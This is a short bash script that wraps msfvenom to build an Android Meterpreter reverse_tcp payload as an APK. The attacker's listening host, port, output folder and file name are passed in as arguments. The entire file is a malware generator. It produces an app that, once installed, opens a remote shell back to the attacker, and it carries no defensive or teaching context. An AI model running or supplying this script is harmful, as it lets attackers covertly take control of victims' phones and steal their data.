#!/bin/bash

msfvenom -p android/meterpreter/reverse_tcp LHOST="$2" LPORT="$3" -o "$1"/"$4".apk
